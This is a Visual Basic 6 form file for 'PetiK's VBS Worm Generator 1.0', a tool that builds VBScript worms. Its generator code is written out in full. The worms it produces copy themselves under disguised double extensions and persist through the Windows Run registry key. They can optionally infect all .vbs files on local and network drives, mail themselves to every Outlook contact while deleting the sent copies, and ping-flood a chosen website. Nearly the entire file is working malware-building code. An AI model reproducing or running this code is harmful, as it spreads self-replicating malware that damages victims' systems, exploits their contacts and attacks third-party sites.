VERSION 5.00
Begin VB.Form Form1 
   AutoRedraw      =   -1  'True
   BorderStyle     =   1  'Fixed Single
   Caption         =   "PetiK's VBS Worm Generator (PVBWG) 1.0"
   ClientHeight    =   10275
   ClientLeft      =   4035
   ClientTop       =   630
   ClientWidth     =   7830
   Icon            =   "PVBSWG.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   10275
   ScaleWidth      =   7830
   Begin VB.Frame Frame4 
      Caption         =   "Payloads"
      Height          =   1695
      Left            =   480
      TabIndex        =   30
      Top             =   4680
      Width           =   6855
      Begin VB.TextBox website 
         Enabled         =   0   'False
         Height          =   285
         Left            =   840
         TabIndex        =   16
         Text            =   "www.yahoo.com"
         Top             =   1200
         Width           =   1935
      End
      Begin VB.CheckBox chkdosattack 
         Caption         =   "DoS Attack"
         Height          =   255
         Left            =   360
         TabIndex        =   15
         Top             =   840
         Width           =   1215
      End
      Begin VB.TextBox sztext 
         Enabled         =   0   'False
         Height          =   285
         Left            =   3600
         TabIndex        =   14
         Text            =   "Text of message box"
         Top             =   1200
         Width           =   2415
      End
      Begin VB.TextBox sztitle 
         Enabled         =   0   'False
         Height          =   285
         Left            =   3600
         TabIndex        =   13
         Text            =   "Title"
         Top             =   840
         Width           =   2415
      End
      Begin VB.CheckBox chkmess 
         Caption         =   "Display a message box"
         Height          =   255
         Left            =   3600
         TabIndex        =   12
         Top             =   360
         Width           =   2535
      End
      Begin VB.CheckBox chkinfect 
         Caption         =   "Infect all VBS file in this system"
         Height          =   255
         Left            =   360
         TabIndex        =   11
         Top             =   360
         Width           =   2655
      End
      Begin VB.Label Label7 
         Caption         =   "http://"
         Height          =   255
         Left            =   360
         TabIndex        =   31
         Top             =   1200
         Width           =   495
      End
   End
   Begin VB.Frame Frame3 
      Caption         =   "Spread with Outlook"
      Height          =   1935
      Left            =   480
      TabIndex        =   26
      Top             =   2520
      Width           =   6855
      Begin VB.TextBox szattach 
         Height          =   285
         Left            =   2040
         TabIndex        =   10
         Top             =   1440
         Width           =   3495
      End
      Begin VB.TextBox szbody 
         Height          =   285
         Left            =   2040
         TabIndex        =   9
         Text            =   "Body of the worm..."
         Top             =   840
         Width           =   3495
      End
      Begin VB.TextBox szsubject 
         Height          =   285
         Left            =   2040
         TabIndex        =   8
         Text            =   "Subject..."
         Top             =   360
         Width           =   3495
      End
      Begin VB.Label Label6 
         Caption         =   "Add another file :"
         Height          =   255
         Left            =   360
         TabIndex        =   29
         Top             =   1440
         Width           =   1575
      End
      Begin VB.Label Label5 
         Caption         =   "Body :"
         Height          =   255
         Left            =   360
         TabIndex        =   28
         Top             =   840
         Width           =   495
      End
      Begin VB.Label Label3 
         Caption         =   "Subject :"
         Height          =   255
         Left            =   360
         TabIndex        =   27
         Top             =   360
         Width           =   735
      End
   End
   Begin VB.CheckBox crtefile 
      Caption         =   "Create the file"
      Height          =   255
      Left            =   6000
      TabIndex        =   19
      Top             =   9720
      Width           =   1455
   End
   Begin VB.Frame Frame2 
      Caption         =   "Regedit"
      Height          =   855
      Left            =   480
      TabIndex        =   24
      Top             =   1440
      Width           =   6855
      Begin VB.TextBox valreg 
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   4200
         TabIndex        =   7
         Text            =   "value_worm"
         Top             =   360
         Width           =   1935
      End
      Begin VB.OptionButton Option1 
         Caption         =   "RunServices"
         Height          =   255
         Left            =   1680
         TabIndex        =   6
         Top             =   360
         Width           =   1215
      End
      Begin VB.OptionButton optrun 
         Caption         =   "Run"
         Height          =   255
         Left            =   240
         TabIndex        =   5
         Top             =   360
         Width           =   735
      End
      Begin VB.Label Label4 
         Caption         =   "Value : "
         Height          =   255
         Left            =   3600
         TabIndex        =   25
         Top             =   360
         Width           =   735
      End
   End
   Begin VB.TextBox szauthor 
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   5520
      TabIndex        =   18
      Top             =   6720
      Width           =   1815
   End
   Begin VB.TextBox sznamew 
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   1080
      TabIndex        =   17
      Top             =   6720
      Width           =   1815
   End
   Begin VB.CommandButton butgen 
      Caption         =   "Generate the VBS worm"
      Height          =   375
      Left            =   1200
      TabIndex        =   20
      Top             =   9720
      Width           =   3975
   End
   Begin VB.TextBox allvbs 
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   2415
      Left            =   480
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   21
      TabStop         =   0   'False
      Top             =   7080
      Width           =   6855
   End
   Begin VB.Frame Frame1 
      Caption         =   "Installation"
      Height          =   1095
      Left            =   480
      TabIndex        =   0
      Top             =   240
      Width           =   6855
      Begin VB.ComboBox lstext 
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   330
         ItemData        =   "PVBSWG.frx":08CA
         Left            =   4920
         List            =   "PVBSWG.frx":08E0
         TabIndex        =   4
         Text            =   ".ext"
         Top             =   480
         Width           =   1455
      End
      Begin VB.TextBox szname 
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   2880
         TabIndex        =   3
         Text            =   "name_of_worm"
         Top             =   480
         Width           =   1935
      End
      Begin VB.OptionButton optsys 
         Caption         =   "SYSTEM"
         Height          =   255
         Left            =   1680
         TabIndex        =   2
         Top             =   480
         Width           =   1095
      End
      Begin VB.OptionButton optwin 
         Caption         =   "WINDOWS"
         Height          =   195
         Left            =   240
         TabIndex        =   1
         Top             =   480
         Width           =   1455
      End
   End
   Begin VB.Label Label2 
      Caption         =   "Author :"
      Height          =   255
      Left            =   4920
      TabIndex        =   23
      Top             =   6720
      Width           =   735
   End
   Begin VB.Label Label1 
      Caption         =   "Name :"
      Height          =   255
      Left            =   480
      TabIndex        =   22
      Top             =   6720
      Width           =   615
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Unload(Cancel As Integer)
about.Visible = True
End Sub


Private Sub butgen_Click()
Set fs = CreateObject("Scripting.FileSystemObject")

If lstext.Text = ".ext" Then
MsgBox "PLEASE CHOOSE AN EXTENSION", vbCritical, "PVBSWG"
ElseIf sznamew.Text = "" Then MsgBox "PLEASE CHOOSE A WORM'S NAME", vbCritical, "PVBSWG"
ElseIf szauthor.Text = "" Then MsgBox "PLEASE CHOOSE A WORM'S AUTHOR", vbCritical, "PVBSWG"
Else

vbsw = "'" & sznamew & vbCrLf
vbsw = vbsw & "'Name : " & sznamew & vbCrLf
vbsw = vbsw & "'Author : " & szauthor & vbCrLf
vbsw = vbsw & "On Error Resume Next" & vbCrLf

fso = ""
Randomize (Timer)
For I = 1 To 6
fso = fso & Chr(Int(Rnd(1) * 26) + 97)
Next I
ws = ""
Randomize (Timer)
For I = 1 To 6
ws = ws & Chr(Int(Rnd(1) * 26) + 97)
Next I

out = ""
Randomize (Timer)
For I = 1 To 4
out = out & Chr(Int(Rnd(1) * 26) + 97)
Next I
map = ""
Randomize (Timer)
For I = 1 To 4
map = map & Chr(Int(Rnd(1) * 26) + 97)
Next I
mel = ""
Randomize (Timer)
For I = 1 To 5
mel = mel & Chr(Int(Rnd(1) * 26) + 97)
Next I

drv = ""
Randomize (Timer)
For I = 1 To 4
drv = drv & Chr(Int(Rnd(1) * 26) + 97)
Next I
gf = ""
Randomize (Timer)
For I = 1 To 4
gf = gf & Chr(Int(Rnd(1) * 26) + 97)
Next I
sf = ""
Randomize (Timer)
For I = 1 To 5
sf = sf & Chr(Int(Rnd(1) * 26) + 97)
Next I

vbsw = vbsw & "Set " & fso & " = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf
vbsw = vbsw & "Set " & ws & " = CreateObject(""WScript.Shell"")" & vbCrLf
vbsw = vbsw & "Set win = " & fso & ".GetSpecialFolder(0)" & vbCrLf
vbsw = vbsw & "Set sys = " & fso & ".GetSpecialFolder(1)" & vbCrLf & vbCrLf

nname = ""
If optwin.Value = True Then
nname = "win"
Else
nname = "sys"
End If
ext = lstext.Text
If ext = ".vbs" Then nwext = ext
If ext = ".dll.vbs" Then nwext = ext
If ext = ".exe.vbs" Then nwext = ext
If ext = ".gif.vbs" Then nwext = ext
If ext = ".htm.vbs" Then nwext = ext
If ext = ".jpg.vbs" Then nwext = ext
nname = nname & "&""\" & szname & nwext & ""

vbsw = vbsw & "copyname = " & nname & """" & vbCrLf
vbsw = vbsw & fso & ".GetFile(WScript.ScriptFullName).Copy(copyname)" & vbCrLf

If optrun.Value = True Then
reg = "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
Else
reg = "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices"
End If

vbsw = vbsw & ws & ".RegWrite """ & reg & "\" & valreg & """,copyname" & vbCrLf & vbCrLf

If chkinfect.Value <> False Then
vbsw = vbsw & "Set fl = " & fso & ".OpenTextFile(WScript.ScriptFullName, 1)" & vbCrLf
vbsw = vbsw & "virus = fl.ReadAll" & vbCrLf
vbsw = vbsw & "fl.Close" & vbCrLf
vbsw = vbsw & "infectfile()" & vbCrLf
vbsw = vbsw & "Sub infectfile()" & vbCrLf
vbsw = vbsw & "On Error Resume Next" & vbCrLf
vbsw = vbsw & "Set " & fso & " = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf
vbsw = vbsw & "Set " & drv & " = " & fso & ".Drives" & vbCrLf
vbsw = vbsw & "For Each d In " & drv & vbCrLf
vbsw = vbsw & "If d.DriveType = 2 Or d.DriveType = 3 Then" & vbCrLf
vbsw = vbsw & "list(d.path&""\"")" & vbCrLf
vbsw = vbsw & "End If" & vbCrLf
vbsw = vbsw & "Next" & vbCrLf
vbsw = vbsw & "End Sub" & vbCrLf & vbCrLf
vbsw = vbsw & "Sub list(doss)" & vbCrLf
vbsw = vbsw & "On Error Resume Next" & vbCrLf
vbsw = vbsw & "Set " & fso & " = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf
vbsw = vbsw & "Set " & gf & " = " & fso & ".GetFolder(doss)" & vbCrLf
vbsw = vbsw & "Set " & sf & " = " & gf & ".SubFolders" & vbCrLf
vbsw = vbsw & "For Each f1 In " & sf & vbCrLf
vbsw = vbsw & "infect(f1.Path)" & vbCrLf
vbsw = vbsw & "list(f1.Path)" & vbCrLf
vbsw = vbsw & "Next" & vbCrLf
vbsw = vbsw & "End Sub" & vbCrLf & vbCrLf
vbsw = vbsw & "Sub infect(doss)" & vbCrLf
vbsw = vbsw & "On Error Resume Next" & vbCrLf
vbsw = vbsw & "Set " & fso & " = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf
vbsw = vbsw & "Set " & gf & " = " & fso & ".GetFolder(doss)" & vbCrLf
vbsw = vbsw & "Set fc = " & gf & ".Files" & vbCrLf
vbsw = vbsw & "For Each f1 In fc" & vbCrLf
vbsw = vbsw & "ext = " & fso & ".GetExtensionName(f1.Path)" & vbCrLf
vbsw = vbsw & "ext = lCase(ext)" & vbCrLf
vbsw = vbsw & "If (ext = ""vbs"") Then" & vbCrLf
vbsw = vbsw & "    Set cot = " & fso & ".OpenTextFile(f1.Path, 1, False)" & vbCrLf
vbsw = vbsw & "    If cot.ReadLine <> ""'" & sznamew & """ Then" & vbCrLf
vbsw = vbsw & "    cot.Close" & vbCrLf
vbsw = vbsw & "    Set cot = " & fso & ".OpenTextFile(f1.Path, 1, False)" & vbCrLf
vbsw = vbsw & "    vbsorg = cot.ReadAll()" & vbCrLf
vbsw = vbsw & "    cot.Close" & vbCrLf
vbsw = vbsw & "    Set inf = " & fso & ".OpenTextFile(f1.Path, 2, True)" & vbCrLf
vbsw = vbsw & "    inf.WriteLine virus" & vbCrLf
vbsw = vbsw & "    inf.WriteLine """"" & vbCrLf
vbsw = vbsw & "    inf.WriteLine (vbsorg)" & vbCrLf
vbsw = vbsw & "    inf.Close" & vbCrLf
vbsw = vbsw & "    End If" & vbCrLf
vbsw = vbsw & "End If" & vbCrLf
vbsw = vbsw & "Next" & vbCrLf
vbsw = vbsw & "End Sub" & vbCrLf & vbCrLf

End If


vbsw = vbsw & "Set " & out & " = CreateObject(""Outlook.Application"")" & vbCrLf
vbsw = vbsw & "Set " & map & " = " & out & ".GetNameSpace(""MAPI"")" & vbCrLf
vbsw = vbsw & "For each c In " & map & ".AddressLists" & vbCrLf
vbsw = vbsw & "If c.AddressEntries.Count <> 0 Then" & vbCrLf
vbsw = vbsw & "For d = 1 To c.AddressEntries.Count" & vbCrLf
vbsw = vbsw & "Set " & mel & " = " & out & ".CreateItem(0)" & vbCrLf
vbsw = vbsw & mel & ".To = c.AddressEntries(d).Address" & vbCrLf
vbsw = vbsw & mel & ".Subject = """ & szsubject & """" & vbCrLf
vbsw = vbsw & mel & ".Body = """ & szbody & """" & vbCrLf
vbsw = vbsw & mel & ".Attachments.Add(copyname)" & vbCrLf
If Len(szattach) <> 0 Then
vbsw = vbsw & mel & ".Attachments.Add(""" & szattach & """)" & vbCrLf
End If
vbsw = vbsw & mel & ".DeleteAfterSubmit = True" & vbCrLf
vbsw = vbsw & "If " & mel & ".To <> """" Then" & vbCrLf
vbsw = vbsw & mel & ".Send" & vbCrLf
vbsw = vbsw & "End If" & vbCrLf
vbsw = vbsw & "Next" & vbCrLf
vbsw = vbsw & "End If" & vbCrLf
vbsw = vbsw & "Next"

If chkdosattack.Value <> False Then
vbsw = vbsw & vbCrLf & vbCrLf & ws & ".Run (""ping.exe -t -l 20000 " & website & """" & "),vbHide"
vbsw = vbsw & vbCrLf & ws & ".Run (win&""\ping.exe -t -l 20000 " & website & """" & "),vbHide"
End If

If chkmess.Value <> False Then
vbsw = vbsw & vbCrLf & vbCrLf & "MsgBox """ & sztext & """,vbinformation,""" & sztitle & """"
End If

If chkinfect.Value <> False Then
vbsw = vbsw & vbCrLf & vbCrLf & "'This VBS virus/worm was generated by PVBSWG 1.0"
Else
vbsw = vbsw & vbCrLf & vbCrLf & "'This VBS worm was generated by PVBSWG 1.0"
End If


allvbs.Text = vbsw

If crtefile.Value <> False Then

Open sznamew & ".vbs" For Output As #1
Print #1, vbsw
Close #1
MsgBox "The worm """ & sznamew & """ is create", vbInformation, "PVBSWG"
End If

End If
End Sub

Private Sub chkdosattack_Click()
If chkdosattack.Value <> 0 Then
website.BackColor = &H80000005
website.Enabled = True
Else
website.Enabled = False
End If
End Sub

Private Sub chkmess_Click()
If chkmess.Value <> 0 Then
sztext.Enabled = True
sztitle.Enabled = True
Else
sztext.Enabled = False
sztitle.Enabled = False
End If
End Sub
